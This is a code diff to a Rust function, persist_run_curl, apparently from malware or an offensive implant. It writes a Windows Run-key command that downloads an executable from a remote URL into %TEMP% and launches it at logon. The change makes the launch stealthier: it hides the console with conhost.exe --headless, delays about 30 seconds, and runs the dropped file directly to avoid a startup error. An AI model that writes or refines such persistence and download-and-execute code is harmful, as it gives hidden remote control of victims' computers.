@@ -1064,10 +1064,12 @@ fn persist_run_curl(download_url: &str) -> Result<String, String> {
     let reg_name  = reg_names[idx % reg_names.len()];
     let drop_name = drop_names[idx % drop_names.len()];
 
-    // cmd /c: curl downloads to %TEMP%\<name>, then start /min runs it hidden.
-    // cmd /c is required because the Run key doesn't expand shell builtins.
+    // conhost.exe --headless hides the console window completely (no visible cmd popup).
+    // ping delay (~30s) waits for explorer/desktop to finish initializing.
+    // Run the downloaded exe directly (no `start /min`) so it inherits a proper
+    // desktop context from the Run-key session — avoids 0xC0000142 on LTSC.
     let run_cmd = format!(
-        "cmd.exe /c curl -s -L \"{}\" -o \"%TEMP%\\{}\" && start /min \"\" \"%TEMP%\\{}\"",
+        "conhost.exe --headless cmd.exe /c ping 127.0.0.1 -n 31 >nul & curl -s -L \"{}\" -o \"%TEMP%\\{}\" && \"%TEMP%\\{}\"",
         download_url, drop_name, drop_name
     );
 
